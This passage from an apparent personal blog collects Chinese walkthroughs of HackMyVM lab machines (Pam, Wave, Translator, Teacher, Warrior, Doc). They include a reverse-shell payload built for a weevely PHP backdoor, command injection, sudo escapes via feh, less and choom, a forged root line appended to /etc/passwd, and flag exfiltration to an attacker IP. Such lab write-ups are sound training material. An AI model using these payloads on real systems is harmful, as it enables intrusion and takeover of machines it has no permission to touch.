<p>这是启动 Shell In A Box 服务，重点是最后的“**-s &#x2F;devel:root:root:&#x2F;:&#x2F;tmp&#x2F;dev**”，指定了另一个路径 <code>/devel</code>，访问该路径时会直接以 root 用户身份进入 <code>/tmp/dev</code> 目录，而且是以root执行。</p>
<p>所以思路是我们创建一个&#x2F;tmp&#x2F;dev，然后在网页端访问&#x2F;devel去执行&#x2F;tmp&#x2F;dev</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325111819.png" ></p>
<p>接下来就是本地开启监听，然后去访问&#x2F;devel</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325111914.png" ></p>
<p>提权成功</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>学习了host的fuzz，最后shellbox的语句，要查阅资料才能读懂，很有趣。</p>
]]></content>
      <tags>
        <tag>hackmyvm</tag>
        <tag>复盘</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm pam复盘</title>
    <url>/2024/03/22/hackmyvm-pam%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址： <a class="link"   href="https://hackmyvm.eu/machines/machine.php?vm=Pam" >https://hackmyvm.eu/machines/machine.php?vm=Pam<i class="fas fa-external-link-alt"></i></a></p>
<p>难度：medium</p>
<p>ip：192.168.64.90</p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>扫到80和21端口，到80端口，是“phpipam is ready.”，phpipam是一个Web IP地址管理应用程序，直接访问&#x2F;phpipam后自动跳转到一个登陆页面</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322105140.png" ></p>
<p>尝试了注入，弱口令啥的，找不到什么可以利用的，扫目录能扫到很多子目录，还没有什么利用思路</p>
<p>转过头来看21端口，lftp用anonymous为账号密码登陆成功，到&#x2F;home目录下还能知道有一个italia账户</p>
<p>到&#x2F;var&#x2F;www&#x2F;html&#x2F;phpipam目录下有很多子目录，没什么头绪</p>
<p>这个时候看wp，让我眼前一亮，思路是<strong>用一个搜索语句搜索可以编辑上传的子目录，然后上传一个后门php，再在网页端访问反弹一个shell</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find -l /var/www/html| grep &quot;d.w..w..w.&quot;</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322105808.png" ></p>
<p>找到两个可以用的目录，我在其中一个上传一个后门</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322105947.png" ></p>
<p>然后在网页访问&#x2F;phpipam&#x2F;app&#x2F;subnets&#x2F;import-subnet&#x2F;upload&#x2F;php-reverse-shell.php</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322110136.png" ></p>
<p>成功拿到第一个shell</p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>输入<strong>ss -lntp</strong>查看有哪些端口开放了，注意到有一个12345端口</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322110258.png" ></p>
<p>curl一下，拿到一大段字符串</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322110405.png" ></p>
<p>看起来像base64，拿到cyberchef解密一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322112416.png" ></p>
<p>看到PNG文件头，以图片的形式保存下来</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322112506.png" ></p>
<p>猜测中间那一串是密码，登陆italia账户</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322112614.png" ></p>
<p>拿到第二个shell</p>
<p>sudo -l查到feh可以利用，在Linux下，feh是一个基于命令行的图像查看器。它特别设计用于快速查看图像</p>
<p>看帮助文档，-A可以指定一个 shell 命令作为要在图像上执行的动作，配合-U不显示图片</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322114316.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322114405.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo feh -uA /bin/bash</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322114517.png" ></p>
<p>提权成功，这个靶机的root.enc是加密过的，</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322114632.png" ></p>
<p>openssl生成的密码，而且前面拿到的那张图片，右下角有一串“-aes-256-cbc”，应该就是加密类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl enc -aes-256-cbc -d -in root.enc -out root.txt -k rootisCLOSE</span><br></pre></td></tr></table></figure>

<p>-d解密，-k指定解密时使用的密钥，解密出来成功拿到flag</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>ftp上传后门，查看内部开放端口，feh的利用，openssl解密</p>
<p>最有收获的是在ftp那里搜索看编辑的目录，学习了。</p>
]]></content>
      <tags>
        <tag>hackmyvm</tag>
        <tag>复盘</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm wave复盘</title>
    <url>/2024/03/22/hackmyvm-wave%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>这个靶机我是边看视频学习边做的的，写复盘目的是理清思路，吸收知识。在这里感谢群主做的视频，链接：<a class="link"   href="https://www.bilibili.com/video/BV1Uu4m1A7BU" >https://www.bilibili.com/video/BV1Uu4m1A7BU<i class="fas fa-external-link-alt"></i></a> </p>
<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://hackmyvm.eu/machines/machine.php?vm=Wave" >https://hackmyvm.eu/machines/machine.php?vm=Wave<i class="fas fa-external-link-alt"></i></a></p>
<p>难度：medium</p>
<p>ip：192.168.64.81</p>
<p>（后面由于靶机重置，ip改为192.168.64.100）</p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>端口扫描扫到22和80端口，先到80端口，没什么东西，然后扫目录，还挺有东西</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322155511.png" ></p>
<p>robots.txt指示要访问&#x2F;backup</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322155642.png" ></p>
<p>就是有一些目录文件，然后注意到index,log,phptest.robots,他们有备份文件证明有源文件，比如index对应index.php,phptest对应phptest.php，那么也有一个叫weevely的文件，文件后缀未知。先下载看看。</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322160208.png" ></p>
<p>一个 PHP Phar（PHP 归档）文件，思路是改名为weevely.phar，然后用脚本还原成php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$phar = new Phar(&quot;weevely.phar&quot;); $phar-&gt;extractTo(&quot;./weevely&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>

<p>解压到子目录weevely下面，解压出来的php，用ai解释一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 定义变量：密钥 $k、密钥头部 $kh、密钥尾部 $kf、参数 $p</span></span><br><span class="line"><span class="variable">$k</span> = <span class="string">&quot;3ddf0d5c&quot;</span>;</span><br><span class="line"><span class="variable">$kh</span> = <span class="string">&quot;b6e7a529b6c2&quot;</span>;</span><br><span class="line"><span class="variable">$kf</span> = <span class="string">&quot;d598a771749b&quot;</span>;</span><br><span class="line"><span class="variable">$p</span> = <span class="string">&quot;afnqDsRcBpVmU71y&quot;</span>;</span><br><span class="line"><span class="comment">// 定义函数：执行异或加密操作</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>, <span class="variable">$k</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$k</span>); <span class="comment">// 计算密钥的长度</span></span><br><span class="line">    <span class="variable">$l</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$t</span>); <span class="comment">// 计算文本的长度</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="string">&quot;&quot;</span>; <span class="comment">// 初始化结果字符串</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 循环遍历文本，执行异或加密操作</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$l</span>;) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; (<span class="variable">$j</span> &lt; <span class="variable">$c</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="variable">$l</span>); <span class="variable">$j</span>++, <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$o</span> .= <span class="variable">$t</span>[<span class="variable">$i</span>] ^ <span class="variable">$k</span>[<span class="variable">$j</span>]; <span class="comment">// 对文本中的每个字符与密钥进行异或操作，并将结果追加到$o中</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$o</span>; <span class="comment">// 返回加密后的结果</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 从输入中解析数据并尝试执行解密的PHP代码</span></span><br><span class="line"><span class="keyword">if</span> (@<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/<span class="subst">$kh</span>(.+)<span class="subst">$kf</span>/&quot;</span>, @<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>), <span class="variable">$m</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">    @<span class="title function_ invoke__">ob_start</span>(); <span class="comment">// 启动输出缓冲区</span></span><br><span class="line">    @<span class="keyword">eval</span>(@<span class="title function_ invoke__">gzuncompress</span>(@<span class="title function_ invoke__">x</span>(@<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$m</span>[<span class="number">1</span>]), <span class="variable">$k</span>))); <span class="comment">// 解密并执行从输入中提取的PHP代码</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$o</span> = @<span class="title function_ invoke__">ob_get_contents</span>(); <span class="comment">// 获取输出缓冲区的内容</span></span><br><span class="line">    @<span class="title function_ invoke__">ob_end_clean</span>(); <span class="comment">// 清空输出缓冲区</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$r</span> = @<span class="title function_ invoke__">base64_encode</span>(@<span class="title function_ invoke__">x</span>(@<span class="title function_ invoke__">gzcompress</span>(<span class="variable">$o</span>), <span class="variable">$k</span>)); <span class="comment">// 对执行结果进行压缩、加密</span></span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;<span class="subst">$p</span><span class="subst">$kh</span><span class="subst">$r</span><span class="subst">$kf</span>&quot;</span>); <span class="comment">// 输出加密后的结果</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>代码逻辑是：php:&#x2F;&#x2F;input也就是接受POST的数据，和$kh,$kf拼接后，先base64解密，经过x函数异或，再用gzuncompress提取出php代码交给eval执行，执行后会把执行结果交给前面一套过程逆向执行。</p>
<p>也就是说，如果我要利用eval执行命令，正常传进去后会被执行一系列逻辑变成乱的，这样自然会执行失败，<strong>思路是写一个脚本，把原先的思路逆过来，传输进去后经过处理会变成正常语句</strong>，脚本如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$k</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$k</span>);<span class="variable">$l</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$t</span>);<span class="variable">$o</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="variable">$l</span>;)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;(<span class="variable">$j</span>&lt;<span class="variable">$c</span>&amp;&amp;<span class="variable">$i</span>&lt;<span class="variable">$l</span>);<span class="variable">$j</span>++,<span class="variable">$i</span>++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$o</span>.=<span class="variable">$t</span>[<span class="variable">$i</span>]^<span class="variable">$k</span>[<span class="variable">$j</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 函数照搬</span></span><br><span class="line"><span class="variable">$k</span>=<span class="string">&quot;3ddf0d5c&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$r</span>=@<span class="title function_ invoke__">base64_encode</span>(@<span class="title function_ invoke__">x</span>(@<span class="title function_ invoke__">gzcompress</span>(<span class="string">&quot;echo shell_exec(&#x27;nc -e /bin/bash 192.168.64.3 8888&#x27;);&quot;</span>),<span class="variable">$k</span>));</span><br><span class="line"><span class="comment">// 这句也可以照搬，中间写入要执行的命令</span></span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$r</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>接下来就可以向weevely发送数据，现在问题是不知道他的后缀，fuzz一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wfuzz -w extension.txt -u &#x27;192.168.64.81/weevely.FUZZ&#x27;</span><br></pre></td></tr></table></figure>

<p>extension.txt里面是一些常见的php后缀，最后测出来是php7</p>
<p>指定脚本，获得要发生的数据，接下来就访问weevely.php7发送POST</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -X POST http://192.168.64.100/weevely.php7 -d <span class="string">&#x27;b6e7a529b6c2S/gvK/6sYkv9LKmvuSuYK36yNKl7MuUuZrQrrPy3eikfqjRWhFDnUAfXtFUDtQY1g2RmE30PNa1oa3Q=d598a771749b&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240323211020.png" ></p>
<p>成功反弹的第一个shell</p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>经过一番搜寻，查看到靶机对内开放了3923端口</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240323211135.png" ></p>
<p>利用socat端口转发到8001端口，访问看看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socat TCP-LISTEN:8001,fork TCP:localhost:3923</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240323211236.png" ></p>
<p>是一个长的比较可爱的文件管理界面，当前目录是&#x2F;root，有文件上传功能也有创建目录功能，那么思路是 <strong>创建一个.ssh目录，在里面上传自己kali的公钥，命名为authorized_keys,然后用攻击机ssh登陆</strong></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240323211509.png" ></p>
<p>上传后看一下有哪些用户名</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-23%2021.15.52.png" ></p>
<p>经过尝试，angie登陆成功</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240323211749.png" ></p>
<p>Sudo -l 查到less可以利用，只能用来阅读&#x2F;opt&#x2F;secret.txt</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240323211813.png" ></p>
<p>看题解学习到提权思路是：</p>
<p>首先less的功能是读取文件，当它读取的文件有很多行一个终端显示不下的时候，最下面可以有一个命令行，我们可以利用这一点输入命令拿到一个&#x2F;bin&#x2F;sh。然后靶机的secret.txt只有两行，这个时候我们只能去kali本机的终端操作，把终端尺寸缩到很小，自然会出现命令行。</p>
<p>输入“sudo &#x2F;usr&#x2F;bin&#x2F;less -F &#x2F;opt&#x2F;secret.txt”，然后缩小终端</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240323212531.png" ></p>
<p>缩到这么小，再输入”!&#x2F;bin&#x2F;sh”，成功拿到shell，提权成功。</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240323212632.png" ></p>
]]></content>
      <tags>
        <tag>hackmyvm</tag>
        <tag>复盘</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm 复盘合集1</title>
    <url>/2024/03/16/hackmyvm%E5%A4%8D%E7%9B%98%E5%90%88%E9%9B%861/</url>
    <content><![CDATA[<h3 id="translator"><a href="#translator" class="headerlink" title="translator"></a>translator</h3><p>来到80端口看到有个translator的界面，随便输了abc，返回zyx，试了几次确认加密逻辑就是一对一替换，a-z，b-y这样，但是数字和大写字母是不会变的，扫了目录也没看到有什么东西</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-16%2018.15.54.png" ></p>
<p>然后看了wp才知道，<strong>这个输入框可以命令注入，要先有个分号隔断，并且要输入的命令要先transalte一下</strong>（有点解谜），比如要使用id命令，就要输入“；rw”</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-16%2018.22.42.png"   alt="像这样" style="zoom:50%;" >

<p>那就先nc拿到一个shell，主要要先把命令translate一下</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316182706.png"   style="zoom:50%;" >

<p>就拿到第一个shell，我感觉有点脑洞，可能是见识的不够多吧，代码逻辑如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$test = $_GET[&#x27;hmv&#x27;];</span><br><span class="line">$test = escapeshellcmd($test);// 应该是用来防止命令注入的，输入分号后前面跟了一个\，但是经过下面第一个system斜杆又没了</span><br><span class="line">echo (&quot;Translated to:&quot;);</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">$ultima_linea = system(&#x27;echo &#x27;.$test.&#x27;| tr abcdefghijklmnopqrstuvwxyz zyxwvutsrqponmlkjihgfedcba&#x27;);</span><br><span class="line">$ulti = system(&#x27;echo &#x27;.$ultima_linea.&#x27;| tr &quot;php&quot; &quot;wtf&quot;&#x27;); // 用分号实现命令注入</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>然后在html目录下有个hvxing文件，打开查看是段字符串，第一反应是拿去网页translate一下</p>
<p>然后就拿到一个密码，到&#x2F;home目录下看到有两个用户，尝试了一下ocean登陆成功</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316185134.png"   style="zoom:50%;" >

<p>然后sudo -l看到有choom可以利用，india可以不用密码，gtfobins查询到了提权命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -u india /usr/bin/choom -n 0 /bin/sh</span><br></pre></td></tr></table></figure>

<h4 id="第二个flag"><a href="#第二个flag" class="headerlink" title="第二个flag"></a>第二个flag</h4><p>就切换到了india账户，再sudo -l查找，有一个trans可以利用，file看了一下是个是个shell的脚本</p>
<p>cat看了一下内容很多，切换个思路-h看看帮助文档</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316185857.png"   style="zoom:50%;" >

<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316185917.png"   style="zoom:50%;" >

<p>注意到有input file也可以开个http代理，那就尝试结合这两个功能把&#x2F;root&#x2F;root.txt读出来</p>
<p>kali先开个nc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo trans -i /root/root.txt -x 192.168.64.3:8888</span><br><span class="line">nc -lvp 8888 &gt; trans</span><br></pre></td></tr></table></figure>

<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316190434.png"   style="zoom:50%;" >

<p>得到一个包，尝试了一下url解码q后面的内容，就拿到flag</p>
<h4 id="提权思路"><a href="#提权思路" class="headerlink" title="提权思路"></a>提权思路</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkpasswd -m sha-512</span><br></pre></td></tr></table></figure>

<p>先生成一个哈希字符串，然后拼接一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">but:$6$qzFU83LRKpBUmZCQ$qCQiwtXEjJmtTAOO2HRJsneHiliw9k2V2/3EtU64v9tP2eaud5fdtp5pQurFVtEsovQjfbo2j3KY.JmF0QqEL/:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>

<p>先复制一份原来的&#x2F;etc&#x2F;passwd，在&#x2F;tmp目录下伪造一个一样的最下面在加入我们伪造的字符串，<strong>思路就给靶机多加一个用户，有root权限</strong>，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -u root trans -i www -o /etc/passwd -no-auto</span><br></pre></td></tr></table></figure>

<p>写入之后登陆我们伪造的用户，成功提权到root</p>
<h5 id="小抽象"><a href="#小抽象" class="headerlink" title="小抽象"></a>小抽象</h5><p>就是利用读写功能获取我们想要的东西，也可以对关键文件进行篡改</p>
<h3 id="teacher"><a href="#teacher" class="headerlink" title="teacher"></a>teacher</h3><p>web端扫描目录扫到，access.php,log.php，clearlog.php，看一下log.php，内容说有一个rabbit.jpg，访问之后一张·图片·，最开始用stegseek出了得到一个secret.txt里面写着”rabbithole”，不明所以，尝试登陆ssh也没有用</p>
<p>去到access.jpg，源代码src后面是空的，就联想到有没有可以写入的参数，fuzz了一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316200751.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wfuzz -u &#x27;http://192.168.64.77/access.php?FUZZ=rabbit.jpg&#x27; -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hh=12</span><br></pre></td></tr></table></figure>

<p>果然得到了一个参数‘id’，然后看到了图片</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316200944.png" ></p>
<p>再看看这时的源码，然后就联想到命令注入，先闭合单引号，在写入命令试试</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316201116.png" ></p>
<p>经过一番探索（结合wp），发现可以直接注入php语句，还要配合前面的log.php，因为access.php不会执行，log.php记录了这些并且会执行，例如：</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316201809.png" ></p>
<p>发现了利用点，那就拿到第一个shell了，在html目录下发现有个pdf，下载查看</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316202025.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316202055.png" ></p>
<p>虽然密码被糊住了，但是可以在前面找到自己，反向写出来就行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Pass = ThankYouTeachers</span><br></pre></td></tr></table></figure>

<p>然后就登陆了mrteacher账户，成功拿到userflag</p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>Sudo -l 看到有gedit和xauth可以利用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(ALL : ALL) NOPASSWD: /bin/gedit, /bin/xauth</span><br></pre></td></tr></table></figure>

<p>查了一下，<strong>xauth命令</strong> 用于显示和编辑被用于连接X服务器的认证信息。<strong>gedit</strong>是个文本编辑器</p>
<p><strong>思路就是利用gedit查看或修改root.txt（或其他任意文件），在这之前要先利用xauth增加一个认证，并且ssh登陆账号要加-x让SSH 客户端会在连接过程中启用 X11 转发。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ ssh -X mrteacher@192.168.64.77</span><br><span class="line">mrteacher@192.168.64.77&#x27;s password: </span><br><span class="line">Linux Teacher 5.10.0-17-amd64 #1 SMP Debian 5.10.136-1 (2022-08-13) x86_64</span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Sat Mar 16 13:25:36 2024 from 192.168.64.3</span><br><span class="line">mrteacher@Teacher:~$ sudo xauth list  列出当前用户的 X 认证信息</span><br><span class="line">Teacher/unix:10  MIT-MAGIC-COOKIE-1  5cfe7a29e891b822c5892ea140dc6706</span><br><span class="line">mrteacher@Teacher:~$ sudo xauth add Teacher/unix:10  MIT-MAGIC-COOKIE-1  5cfe7a29e891b822c5892ea140dc6706</span><br><span class="line">向授权文件中添加一个 MIT-MAGIC-COOKIE-1 权限</span><br></pre></td></tr></table></figure>

<p>增加权限后就使用gedit了，这个时候可以直接读取rootflag，也可以修改&#x2F;etc&#x2F;passwd增加一个用户提权（像上一个靶机一样），两种思路都可以</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo gedit /root/root</span><br></pre></td></tr></table></figure>

<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>web端命令注入结合日志文件，提权方面两个可利用点的结合，伪造用户或读取文件。</p>
<h3 id="warrior"><a href="#warrior" class="headerlink" title="warrior"></a>warrior</h3><p>web端扫到robots.txt</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240317014210.png" ></p>
<p>User.txt里面有个名字‘loco’我还想过爆破ssh，没有结果，secret.txt一个字符串看起来不是密码</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240317014232.png" ></p>
<p>internal.php说要把MAC地址改成00:00:00:00:00:a? 最后一个问号还要一个一个试，网上找教程修改kali都mac地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# ifconfig eth0 down</span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# ifconfig eth0 hw ether 00:00:00:00:00:af //最后试出来是af</span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# ifconfig eth0 up                        </span><br><span class="line">                                  </span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240317011739.png" ></p>
<p>然后再访问，就得到了密码，我尝试了loco作为用户名居然无效，最后看了wp才知道还有一个用户名可以是bro（扶额苦笑），然后顺利登陆，想输入sudo回显没有这个命令，路径没设置好，要调用应该在&#x2F;usr&#x2F;sbin&#x2F;sudo，查到有个task可以利用，找了提权语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/sbin/sudo /usr/bin/task execute /bin/sh</span><br></pre></td></tr></table></figure>

<p>顺利拿到root</p>
<h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p>这个靶机的点主要在切换mac地址，还要尝试出来最后一位是f，bro这个也难想，以后要多考虑可以用cewl生成字典，提权比较简单。</p>
<h3 id="doc"><a href="#doc" class="headerlink" title="doc"></a>doc</h3><h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>难度：easy</p>
<p>地址：<a class="link"   href="https://hackmyvm.eu/machines/machine.php?vm=Doc" >https://hackmyvm.eu/machines/machine.php?vm=Doc<i class="fas fa-external-link-alt"></i></a></p>
<p>ip地址：192.168.64.104</p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>开了80端口和3306端口，先看看80端口，一打开就看到login选项，点击后发现要配置hosts文件，配置为doc.hmv，然后面对登陆框，</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325100855.png" ></p>
<p>可以看到用了一个OTOMS的框架，有找到相关版本的漏洞，但要先登陆，随便输入点再抓个包，sqlmap测一下，是可以注入的</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325101135.png" ></p>
<p>爆出两个数据库，再仔细看看里面的内容</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325101328.png" ></p>
